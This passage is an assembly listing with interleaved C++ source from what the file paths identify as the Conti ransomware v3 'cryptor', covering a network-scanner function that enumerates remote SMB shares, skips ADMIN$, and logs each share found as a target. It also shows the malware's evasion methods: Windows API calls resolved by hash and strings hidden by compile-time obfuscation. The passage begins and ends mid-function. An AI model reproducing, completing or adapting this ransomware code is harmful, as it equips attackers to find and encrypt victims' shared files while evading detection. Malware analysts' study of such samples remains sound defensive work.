  00855	c3		 ret	 0
?GetSubnets@@YAHPEAUsubnet_list_@@@Z ENDP		; GetSubnets
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp
;	COMDAT ?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z
_TEXT	SEGMENT
$T3 = 64
$T2 = 72
$T1 = 80
$T4 = 96
ShareInfoBuffer$ = 136
er$ = 144
resume$ = 148
tr$ = 152
__$ArrayPad$ = 160
pwszIpAddress$ = 240
ShareList$ = 248
?EnumShares@network_scanner@@YAXPEA_WPEAUshare_list_@1@@Z PROC ; network_scanner::EnumShares, COMDAT

; 228  : {

$LN243:
  00000	40 55		 push	 rbp
  00002	41 54		 push	 r12
  00004	41 55		 push	 r13
  00006	41 56		 push	 r14
  00008	41 57		 push	 r15
  0000a	48 8d 6c 24 c9	 lea	 rbp, QWORD PTR [rsp-55]
  0000f	48 81 ec c0 00
	00 00		 sub	 rsp, 192		; 000000c0H
  00016	48 8b 05 00 00
	00 00		 mov	 rax, QWORD PTR __security_cookie
  0001d	48 33 c4	 xor	 rax, rsp
  00020	48 89 45 17	 mov	 QWORD PTR __$ArrayPad$[rbp-137], rax

; 229  : 	NET_API_STATUS Result;
; 230  : 	LPSHARE_INFO_1 ShareInfoBuffer = NULL;

  00024	45 33 ed	 xor	 r13d, r13d
  00027	4c 8b fa	 mov	 r15, rdx
  0002a	4c 8b e1	 mov	 r12, rcx
  0002d	4c 89 6d ff	 mov	 QWORD PTR ShareInfoBuffer$[rbp-137], r13

; 231  : 	DWORD er = 0, tr = 0, resume = 0;;

  00031	44 89 6d 07	 mov	 DWORD PTR er$[rbp-137], r13d
  00035	44 89 6d 0f	 mov	 DWORD PTR tr$[rbp-137], r13d
  00039	45 8d 75 01	 lea	 r14d, QWORD PTR [r13+1]
  0003d	44 89 6d 0b	 mov	 DWORD PTR resume$[rbp-137], r13d
$LL4@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 680  : 	pFunction = (DWORD(WINAPI*)(WCHAR*, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD))getapi::GetProcAddressEx2(NULL, NETAPI32_MODULE_ID, 0x40d14d9a, 50);//GetProcAddress(hNetApi32, OBFA("NetShareEnum"));

  00041	ba 11 00 00 00	 mov	 edx, 17
  00046	41 b8 9a 4d d1
	40		 mov	 r8d, 1087458714		; 40d14d9aH
  0004c	44 8d 4a 21	 lea	 r9d, QWORD PTR [rdx+33]
  00050	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 681  : 	return pFunction(servername, level, bufptr, prefmaxlen, entriesread, totalentries, resume_handle);

  00055	48 8d 4d 0b	 lea	 rcx, QWORD PTR resume$[rbp-137]
  00059	41 b9 ff ff ff
	ff		 mov	 r9d, -1			; ffffffffH
  0005f	48 89 4c 24 30	 mov	 QWORD PTR [rsp+48], rcx
  00064	4c 8d 45 ff	 lea	 r8, QWORD PTR ShareInfoBuffer$[rbp-137]
  00068	48 8d 4d 0f	 lea	 rcx, QWORD PTR tr$[rbp-137]
  0006c	41 8b d6	 mov	 edx, r14d
  0006f	48 89 4c 24 28	 mov	 QWORD PTR [rsp+40], rcx
  00074	48 8d 4d 07	 lea	 rcx, QWORD PTR er$[rbp-137]
  00078	48 89 4c 24 20	 mov	 QWORD PTR [rsp+32], rcx
  0007d	49 8b cc	 mov	 rcx, r12
  00080	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 236  : 		if (Result == ERROR_SUCCESS)

  00082	85 c0		 test	 eax, eax
  00084	74 0c		 je	 SHORT $LN224@EnumShares

; 266  : 
; 267  : 			}
; 268  : 
; 269  : 			pNetApiBufferFree(ShareInfoBuffer);
; 270  : 		}
; 271  : 
; 272  : 	} while (Result == ERROR_MORE_DATA);

  00086	3d ea 00 00 00	 cmp	 eax, 234		; 000000eaH
  0008b	74 b4		 je	 SHORT $LL4@EnumShares
  0008d	e9 05 04 00 00	 jmp	 $LN223@EnumShares
$LN224@EnumShares:
  00092	48 89 b4 24 b8
	00 00 00	 mov	 QWORD PTR [rsp+184], rsi

; 237  : 		{
; 238  : 
; 239  : 			LPSHARE_INFO_1 TempShareInfo = ShareInfoBuffer;

  0009a	48 8b 75 ff	 mov	 rsi, QWORD PTR ShareInfoBuffer$[rbp-137]

; 240  : 
; 241  : 			for (DWORD i = 1; i <= er; i++)

  0009e	44 39 75 07	 cmp	 DWORD PTR er$[rbp-137], r14d
  000a2	0f 82 ce 03 00
	00		 jb	 $LN6@EnumShares
  000a8	48 89 9c 24 00
	01 00 00	 mov	 QWORD PTR [rsp+256], rbx
  000b0	48 89 bc 24 b0
	00 00 00	 mov	 QWORD PTR [rsp+176], rdi
  000b8	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL7@EnumShares:

; 242  : 			{
; 243  : 
; 244  : 				if (TempShareInfo->shi1_type == STYPE_DISKTREE	||
; 245  : 					TempShareInfo->shi1_type == STYPE_SPECIAL	||

  000c0	8b 46 08	 mov	 eax, DWORD PTR [rsi+8]
  000c3	a9 ff ff ff 3f	 test	 eax, 1073741823		; 3fffffffH
  000c8	0f 85 83 03 00
	00		 jne	 $LN9@EnumShares
  000ce	3d 00 00 00 c0	 cmp	 eax, -1073741824	; c0000000H
  000d3	0f 84 78 03 00
	00		 je	 $LN9@EnumShares
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\memory.cpp

; 5    : 	LPVOID mem = malloc(Size);

  000d9	b9 10 7d 00 00	 mov	 ecx, 32016		; 00007d10H
  000de	e8 00 00 00 00	 call	 malloc

; 6    : 	memset(mem, 0, Size);

  000e3	33 d2		 xor	 edx, edx
  000e5	41 b8 10 7d 00
	00		 mov	 r8d, 32016		; 00007d10H
  000eb	48 8b c8	 mov	 rcx, rax
  000ee	48 8b f8	 mov	 rdi, rax
  000f1	e8 00 00 00 00	 call	 memset
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 251  : 					if (ShareInfo && plstrcmpiW(TempShareInfo->shi1_netname, OBFW(L"ADMIN$"))) {

  000f6	48 85 ff	 test	 rdi, rdi
  000f9	0f 84 52 03 00
	00		 je	 $LN9@EnumShares
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000ff	44 88 6d c7	 mov	 BYTE PTR $T1[rbp-137], r13b
  00103	c6 45 c8 04	 mov	 BYTE PTR $T1[rbp-136], 4
  00107	c6 45 c9 30	 mov	 BYTE PTR $T1[rbp-135], 48 ; 00000030H
  0010b	c6 45 ca 2b	 mov	 BYTE PTR $T1[rbp-134], 43 ; 0000002bH
  0010f	c6 45 cb 30	 mov	 BYTE PTR $T1[rbp-133], 48 ; 00000030H
  00113	c6 45 cc 21	 mov	 BYTE PTR $T1[rbp-132], 33 ; 00000021H
  00117	c6 45 cd 30	 mov	 BYTE PTR $T1[rbp-131], 48 ; 00000030H
  0011b	c6 45 ce 6c	 mov	 BYTE PTR $T1[rbp-130], 108 ; 0000006cH
  0011f	c6 45 cf 30	 mov	 BYTE PTR $T1[rbp-129], 48 ; 00000030H
  00123	c6 45 d0 2e	 mov	 BYTE PTR $T1[rbp-128], 46 ; 0000002eH
  00127	c6 45 d1 30	 mov	 BYTE PTR $T1[rbp-127], 48 ; 00000030H
  0012b	c6 45 d2 08	 mov	 BYTE PTR $T1[rbp-126], 8
  0012f	c6 45 d3 30	 mov	 BYTE PTR $T1[rbp-125], 48 ; 00000030H
  00133	c6 45 d4 30	 mov	 BYTE PTR $T1[rbp-124], 48 ; 00000030H
  00137	c6 45 d5 30	 mov	 BYTE PTR $T1[rbp-123], 48 ; 00000030H
  0013b	0f b6 45 c8	 movzx	 eax, BYTE PTR $T1[rbp-136]

; 58   :         return m_isDecrypted;

  0013f	0f b6 45 c7	 movzx	 eax, BYTE PTR $T1[rbp-137]

; 63   :         if (!isDecrypted())

  00143	84 c0		 test	 al, al
  00145	75 5a		 jne	 SHORT $LN54@EnumShares

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00147	4d 8b c5	 mov	 r8, r13
  0014a	66 0f 1f 44 00
	00		 npad	 6
$LL55@EnumShares:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00150	42 0f b6 4c 05
	c8		 movzx	 ecx, BYTE PTR $T1[rbp+r8-136]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00156	b8 30 00 00 00	 mov	 eax, 48			; 00000030H
  0015b	2b c1		 sub	 eax, ecx
  0015d	6b c8 27	 imul	 ecx, eax, 39		; 00000027H

; 40   :     return (a % n + n) % n;

  00160	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00165	f7 e9		 imul	 ecx
  00167	03 d1		 add	 edx, ecx
  00169	c1 fa 06	 sar	 edx, 6
  0016c	8b c2		 mov	 eax, edx
  0016e	c1 e8 1f	 shr	 eax, 31
  00171	03 d0		 add	 edx, eax
  00173	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00176	2b c8		 sub	 ecx, eax
  00178	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0017d	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00180	f7 e9		 imul	 ecx
  00182	03 d1		 add	 edx, ecx
  00184	c1 fa 06	 sar	 edx, 6
  00187	8b c2		 mov	 eax, edx
  00189	c1 e8 1f	 shr	 eax, 31
  0018c	03 d0		 add	 edx, eax
  0018e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00191	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00193	42 88 4c 05 c8	 mov	 BYTE PTR $T1[rbp+r8-136], cl
  00198	49 ff c0	 inc	 r8
  0019b	49 83 f8 0e	 cmp	 r8, 14
  0019f	72 af		 jb	 SHORT $LL55@EnumShares
$LN54@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 251  : 					if (ShareInfo && plstrcmpiW(TempShareInfo->shi1_netname, OBFW(L"ADMIN$"))) {

  001a1	48 8b 1e	 mov	 rbx, QWORD PTR [rsi]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 343  : 	pFunction = (INT(WINAPI*)(LPCWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xcd7328ca, 81);//GetProcAddress(hKernel32, OBFA("lstrcmpiW"));

  001a4	ba 0f 00 00 00	 mov	 edx, 15
  001a9	41 b8 ca 28 73
	cd		 mov	 r8d, -848090934		; cd7328caH
  001af	44 8d 4a 42	 lea	 r9d, QWORD PTR [rdx+66]
  001b3	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 344  : 	return pFunction(lpString1, lpString2);

  001b8	48 8d 55 c8	 lea	 rdx, QWORD PTR $T1[rbp-136]
  001bc	48 8b cb	 mov	 rcx, rbx
  001bf	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 251  : 					if (ShareInfo && plstrcmpiW(TempShareInfo->shi1_netname, OBFW(L"ADMIN$"))) {

  001c1	85 c0		 test	 eax, eax
  001c3	0f 84 88 02 00
	00		 je	 $LN9@EnumShares
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  001c9	44 88 6d bf	 mov	 BYTE PTR $T2[rbp-137], r13b
  001cd	c6 45 c0 0e	 mov	 BYTE PTR $T2[rbp-136], 14
  001d1	c6 45 c1 1d	 mov	 BYTE PTR $T2[rbp-135], 29
  001d5	c6 45 c2 0e	 mov	 BYTE PTR $T2[rbp-134], 14
  001d9	c6 45 c3 1d	 mov	 BYTE PTR $T2[rbp-133], 29
  001dd	c6 45 c4 1d	 mov	 BYTE PTR $T2[rbp-132], 29
  001e1	c6 45 c5 1d	 mov	 BYTE PTR $T2[rbp-131], 29
  001e5	0f b6 45 c0	 movzx	 eax, BYTE PTR $T2[rbp-136]

; 58   :         return m_isDecrypted;

  001e9	0f b6 45 bf	 movzx	 eax, BYTE PTR $T2[rbp-137]

; 63   :         if (!isDecrypted())

  001ed	84 c0		 test	 al, al
  001ef	75 63		 jne	 SHORT $LN82@EnumShares

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  001f1	4d 8b c5	 mov	 r8, r13
  001f4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL83@EnumShares:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00200	42 0f b6 4c 05
	c0		 movzx	 ecx, BYTE PTR $T2[rbp+r8-136]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00206	b8 1d 00 00 00	 mov	 eax, 29
  0020b	2b c1		 sub	 eax, ecx
  0020d	8d 0c 80	 lea	 ecx, DWORD PTR [rax+rax*4]

; 40   :     return (a % n + n) % n;

  00210	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00215	c1 e1 03	 shl	 ecx, 3

; 40   :     return (a % n + n) % n;

  00218	f7 e9		 imul	 ecx
  0021a	03 d1		 add	 edx, ecx
  0021c	c1 fa 06	 sar	 edx, 6
  0021f	8b c2		 mov	 eax, edx
  00221	c1 e8 1f	 shr	 eax, 31
  00224	03 d0		 add	 edx, eax
  00226	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00229	2b c8		 sub	 ecx, eax
  0022b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00230	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00233	f7 e9		 imul	 ecx
  00235	03 d1		 add	 edx, ecx
  00237	c1 fa 06	 sar	 edx, 6
  0023a	8b c2		 mov	 eax, edx
  0023c	c1 e8 1f	 shr	 eax, 31
  0023f	03 d0		 add	 edx, eax
  00241	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00244	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00246	42 88 4c 05 c0	 mov	 BYTE PTR $T2[rbp+r8-136], cl
  0024b	49 ff c0	 inc	 r8
  0024e	49 83 f8 06	 cmp	 r8, 6
  00252	72 ac		 jb	 SHORT $LL83@EnumShares
$LN82@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 277  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x3fd9cc6a, 87);//GetProcAddress(hKernel32, OBFA("lstrcpyW"));

  00254	ba 0f 00 00 00	 mov	 edx, 15
  00259	41 b8 6a cc d9
	3f		 mov	 r8d, 1071238250		; 3fd9cc6aH
  0025f	44 8d 4a 48	 lea	 r9d, QWORD PTR [rdx+72]
  00263	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 278  : 	return pFunction(lpString1, lpString2);

  00268	48 8d 55 c0	 lea	 rdx, QWORD PTR $T2[rbp-136]
  0026c	48 8b cf	 mov	 rcx, rdi
  0026f	ff d0		 call	 rax

; 219  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));

  00271	ba 0f 00 00 00	 mov	 edx, 15
  00276	41 b8 15 99 da
	d1		 mov	 r8d, -774203115		; d1da9915H
  0027c	44 8d 4a 4d	 lea	 r9d, QWORD PTR [rdx+77]
  00280	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 220  : 	return pFunction(lpString1, lpString2);

  00285	49 8b d4	 mov	 rdx, r12
  00288	48 8b cf	 mov	 rcx, rdi
  0028b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0028d	44 88 6d b7	 mov	 BYTE PTR $T3[rbp-137], r13b
  00291	c6 45 b8 18	 mov	 BYTE PTR $T3[rbp-136], 24
  00295	c6 45 b9 7a	 mov	 BYTE PTR $T3[rbp-135], 122 ; 0000007aH
  00299	c6 45 ba 7a	 mov	 BYTE PTR $T3[rbp-134], 122 ; 0000007aH
  0029d	c6 45 bb 7a	 mov	 BYTE PTR $T3[rbp-133], 122 ; 0000007aH
  002a1	0f b6 45 b8	 movzx	 eax, BYTE PTR $T3[rbp-136]

; 58   :         return m_isDecrypted;

  002a5	0f b6 45 b7	 movzx	 eax, BYTE PTR $T3[rbp-137]

; 63   :         if (!isDecrypted())

  002a9	84 c0		 test	 al, al
  002ab	75 54		 jne	 SHORT $LN108@EnumShares

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  002ad	4d 8b c5	 mov	 r8, r13
$LL109@EnumShares:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002b0	42 0f b6 4c 05
	b8		 movzx	 ecx, BYTE PTR $T3[rbp+r8-136]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  002b6	b8 7a 00 00 00	 mov	 eax, 122		; 0000007aH
  002bb	2b c1		 sub	 eax, ecx
  002bd	6b c8 2d	 imul	 ecx, eax, 45		; 0000002dH

; 40   :     return (a % n + n) % n;

  002c0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  002c5	f7 e9		 imul	 ecx
  002c7	03 d1		 add	 edx, ecx
  002c9	c1 fa 06	 sar	 edx, 6
  002cc	8b c2		 mov	 eax, edx
  002ce	c1 e8 1f	 shr	 eax, 31
  002d1	03 d0		 add	 edx, eax
  002d3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002d6	2b c8		 sub	 ecx, eax
  002d8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  002dd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  002e0	f7 e9		 imul	 ecx
  002e2	03 d1		 add	 edx, ecx
  002e4	c1 fa 06	 sar	 edx, 6
  002e7	8b c2		 mov	 eax, edx
  002e9	c1 e8 1f	 shr	 eax, 31
  002ec	03 d0		 add	 edx, eax
  002ee	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  002f1	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  002f3	42 88 4c 05 b8	 mov	 BYTE PTR $T3[rbp+r8-136], cl
  002f8	49 ff c0	 inc	 r8
  002fb	49 83 f8 04	 cmp	 r8, 4
  002ff	72 af		 jb	 SHORT $LL109@EnumShares
$LN108@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 219  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));

  00301	ba 0f 00 00 00	 mov	 edx, 15
  00306	41 b8 15 99 da
	d1		 mov	 r8d, -774203115		; d1da9915H
  0030c	44 8d 4a 4d	 lea	 r9d, QWORD PTR [rdx+77]
  00310	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 220  : 	return pFunction(lpString1, lpString2);

  00315	48 8d 55 b8	 lea	 rdx, QWORD PTR $T3[rbp-136]
  00319	48 8b cf	 mov	 rcx, rdi
  0031c	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 256  : 						plstrcatW(ShareInfo->wszSharePath, TempShareInfo->shi1_netname);

  0031e	48 8b 1e	 mov	 rbx, QWORD PTR [rsi]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 219  : 	pFunction = (LPWSTR(WINAPI*)(LPWSTR, LPCWSTR))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd1da9915, 92);//GetProcAddress(hKernel32, OBFA("lstrcatW"));

  00321	ba 0f 00 00 00	 mov	 edx, 15
  00326	41 b8 15 99 da
	d1		 mov	 r8d, -774203115		; d1da9915H
  0032c	44 8d 4a 4d	 lea	 r9d, QWORD PTR [rdx+77]
  00330	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 220  : 	return pFunction(lpString1, lpString2);

  00335	48 8b d3	 mov	 rdx, rbx
  00338	48 8b cf	 mov	 rcx, rdi
  0033b	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0033d	44 88 6d d7	 mov	 BYTE PTR $T4[rbp-137], r13b
  00341	c6 45 d8 58	 mov	 BYTE PTR $T4[rbp-136], 88 ; 00000058H
  00345	c6 45 d9 75	 mov	 BYTE PTR $T4[rbp-135], 117 ; 00000075H
  00349	c6 45 da 78	 mov	 BYTE PTR $T4[rbp-134], 120 ; 00000078H
  0034d	c6 45 db 75	 mov	 BYTE PTR $T4[rbp-133], 117 ; 00000075H
  00351	c6 45 dc 67	 mov	 BYTE PTR $T4[rbp-132], 103 ; 00000067H
  00355	c6 45 dd 75	 mov	 BYTE PTR $T4[rbp-131], 117 ; 00000075H
  00359	c6 45 de 11	 mov	 BYTE PTR $T4[rbp-130], 17
  0035d	c6 45 df 75	 mov	 BYTE PTR $T4[rbp-129], 117 ; 00000075H
  00361	c6 45 e0 03	 mov	 BYTE PTR $T4[rbp-128], 3
  00365	c6 45 e1 75	 mov	 BYTE PTR $T4[rbp-127], 117 ; 00000075H
  00369	c6 45 e2 6f	 mov	 BYTE PTR $T4[rbp-126], 111 ; 0000006fH
  0036d	c6 45 e3 75	 mov	 BYTE PTR $T4[rbp-125], 117 ; 00000075H
  00371	c6 45 e4 18	 mov	 BYTE PTR $T4[rbp-124], 24
  00375	c6 45 e5 75	 mov	 BYTE PTR $T4[rbp-123], 117 ; 00000075H
  00379	c6 45 e6 22	 mov	 BYTE PTR $T4[rbp-122], 34 ; 00000022H
  0037d	c6 45 e7 75	 mov	 BYTE PTR $T4[rbp-121], 117 ; 00000075H
  00381	c6 45 e8 4b	 mov	 BYTE PTR $T4[rbp-120], 75 ; 0000004bH
  00385	c6 45 e9 75	 mov	 BYTE PTR $T4[rbp-119], 117 ; 00000075H
  00389	c6 45 ea 30	 mov	 BYTE PTR $T4[rbp-118], 48 ; 00000030H
  0038d	c6 45 eb 75	 mov	 BYTE PTR $T4[rbp-117], 117 ; 00000075H
  00391	c6 45 ec 6a	 mov	 BYTE PTR $T4[rbp-116], 106 ; 0000006aH
  00395	c6 45 ed 75	 mov	 BYTE PTR $T4[rbp-115], 117 ; 00000075H
  00399	c6 45 ee 6f	 mov	 BYTE PTR $T4[rbp-114], 111 ; 0000006fH
  0039d	c6 45 ef 75	 mov	 BYTE PTR $T4[rbp-113], 117 ; 00000075H
  003a1	c6 45 f0 76	 mov	 BYTE PTR $T4[rbp-112], 118 ; 00000076H
  003a5	c6 45 f1 75	 mov	 BYTE PTR $T4[rbp-111], 117 ; 00000075H
  003a9	c6 45 f2 18	 mov	 BYTE PTR $T4[rbp-110], 24
  003ad	c6 45 f3 75	 mov	 BYTE PTR $T4[rbp-109], 117 ; 00000075H
  003b1	c6 45 f4 1d	 mov	 BYTE PTR $T4[rbp-108], 29
  003b5	c6 45 f5 75	 mov	 BYTE PTR $T4[rbp-107], 117 ; 00000075H
  003b9	c6 45 f6 75	 mov	 BYTE PTR $T4[rbp-106], 117 ; 00000075H
  003bd	c6 45 f7 75	 mov	 BYTE PTR $T4[rbp-105], 117 ; 00000075H
  003c1	0f b6 45 d8	 movzx	 eax, BYTE PTR $T4[rbp-136]

; 58   :         return m_isDecrypted;

  003c5	0f b6 45 d7	 movzx	 eax, BYTE PTR $T4[rbp-137]

; 63   :         if (!isDecrypted())

  003c9	84 c0		 test	 al, al
  003cb	75 58		 jne	 SHORT $LN190@EnumShares

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  003cd	4d 8b cd	 mov	 r9, r13
$LL191@EnumShares:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  003d0	42 0f b6 4c 0d
	d8		 movzx	 ecx, BYTE PTR $T4[rbp+r9-136]

; 40   :     return (a % n + n) % n;

  003d6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  003db	83 e9 75	 sub	 ecx, 117		; 00000075H
  003de	44 6b c1 25	 imul	 r8d, ecx, 37		; 00000025H

; 40   :     return (a % n + n) % n;

  003e2	41 f7 e8	 imul	 r8d
  003e5	41 03 d0	 add	 edx, r8d
  003e8	c1 fa 06	 sar	 edx, 6
  003eb	8b c2		 mov	 eax, edx
  003ed	c1 e8 1f	 shr	 eax, 31
  003f0	03 d0		 add	 edx, eax
  003f2	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  003f5	44 2b c0	 sub	 r8d, eax
  003f8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  003fd	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00401	41 f7 e8	 imul	 r8d
  00404	41 03 d0	 add	 edx, r8d
  00407	c1 fa 06	 sar	 edx, 6
  0040a	8b c2		 mov	 eax, edx
  0040c	c1 e8 1f	 shr	 eax, 31
  0040f	03 d0		 add	 edx, eax
  00411	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00414	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00417	46 88 44 0d d8	 mov	 BYTE PTR $T4[rbp+r9-136], r8b
  0041c	49 ff c1	 inc	 r9
  0041f	49 83 f9 20	 cmp	 r9, 32			; 00000020H
  00423	72 ab		 jb	 SHORT $LL191@EnumShares
$LN190@EnumShares:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\network_scanner\network_scanner.cpp

; 258  : 						logs::Write(OBFW(L"Found share %s."), ShareInfo->wszSharePath);

  00425	48 8b d7	 mov	 rdx, rdi
  00428	48 8d 4d d8	 lea	 rcx, QWORD PTR $T4[rbp-136]
  0042c	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 259  : 						TAILQ_INSERT_TAIL(ShareList, ShareInfo, Entries);

  00431	48 8d 8f 00 7d
	00 00		 lea	 rcx, QWORD PTR [rdi+32000]
  00438	4c 89 29	 mov	 QWORD PTR [rcx], r13
  0043b	49 8b 47 08	 mov	 rax, QWORD PTR [r15+8]
  0043f	48 89 87 08 7d
	00 00		 mov	 QWORD PTR [rdi+32008], rax
  00446	49 8b 47 08	 mov	 rax, QWORD PTR [r15+8]
  0044a	48 89 38	 mov	 QWORD PTR [rax], rdi
  0044d	49 89 4f 08	 mov	 QWORD PTR [r15+8], rcx
$LN9@EnumShares:

; 260  : 
; 261  : 					}
; 262  : 
; 263  : 				}
; 264  : 
; 265  : 				TempShareInfo++;

  00451	48 83 c6 18	 add	 rsi, 24
  00455	41 ff c6	 inc	 r14d
  00458	44 3b 75 07	 cmp	 r14d, DWORD PTR er$[rbp-137]
  0045c	0f 86 5e fc ff
	ff		 jbe	 $LL7@EnumShares

; 240  : 
; 241  : 			for (DWORD i = 1; i <= er; i++)

  00462	48 8b bc 24 b0
	00 00 00	 mov	 rdi, QWORD PTR [rsp+176]
  0046a	48 8b 9c 24 00
